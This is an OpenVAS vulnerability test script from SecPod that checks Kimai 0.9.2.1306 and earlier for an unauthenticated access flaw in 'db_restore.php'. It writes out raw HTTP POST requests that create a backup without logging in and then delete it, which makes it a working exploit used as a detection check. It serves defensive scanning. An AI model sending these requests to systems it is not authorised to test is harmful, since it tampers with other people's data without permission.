###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_kimai_security_bypass_vuln.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# Kimai 'db_restore.php'Security Bypass Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2014 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.903512");
  script_version("$Revision: 11867 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-02-25 11:03:19 +0530 (Tue, 25 Feb 2014)");
  script_name("Kimai 'db_restore.php'Security Bypass Vulnerability");

  script_tag(name:"summary", value:"The host is installed with kimai and is prone to security bypass
  vulnerability");
  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP POST request and check whether it
  is possible to bypass security restrictions.");
  script_tag(name:"insight", value:"The flaw is due to an improper restricting access to 'db_restore.php' script");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to conduct certain backup
  and restore operations.");
  script_tag(name:"affected", value:"Kimai version 0.9.2.1306 and prior.");
  script_tag(name:"solution", value:"Upgrade to Kimai version 0.9.3 or later.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/53390");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/84389");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/30010");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 SecPod");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://www.kimai.org/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

kimPort = get_http_port(default:80);

if(!can_host_php(port:kimPort)){
  exit(0);
}

host = http_host_name(port:kimPort);

foreach dir (make_list_unique("/", "/kimai", cgi_dirs(port:kimPort)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item:string(dir, "/index.php"), port:kimPort);

  if('Kimai Login<' >< rcvRes && 'kimaiusername' >< rcvRes)
  {
    ## Backup Creation request
    postdata = "submit=create+backup";
    sndReq = string("POST ", dir, "/db_restore.php HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "Content-Type: application/x-www-form-urlencoded\r\n",
                    "Content-Length: ", strlen(postdata), "\r\n\r\n",
                     postdata);

    ## Send request to create a back-up and get back-up id
    rcvRes = http_keepalive_send_recv(port:kimPort, data:sndReq);

    backId = eregmatch(pattern:'name=.dates.*value=.([0-9]+).', string:rcvRes);
    if(backId[1])
    {
      ## Create a Backup deletion request
      postdata = "dates%5B%5D=" + backId[1] + "&submit=delete";

      sndReq = string("POST ", dir, "/db_restore.php HTTP/1.1\r\n",
                      "Host: ", host, "\r\n",
                      "Content-Type: application/x-www-form-urlencoded\r\n",
                      "Content-Length: ", strlen(postdata), "\r\n\r\n",
                      postdata);

      rcvRes = http_keepalive_send_recv(port:kimPort, data:sndReq);

      if(backId[1] >!< rcvRes && "create backup" >< rcvRes &&
        "!-- delete -->" >< rcvRes)
      {
        security_message(port:kimPort);
        exit(0);
      }
    }
  }
}

exit(99);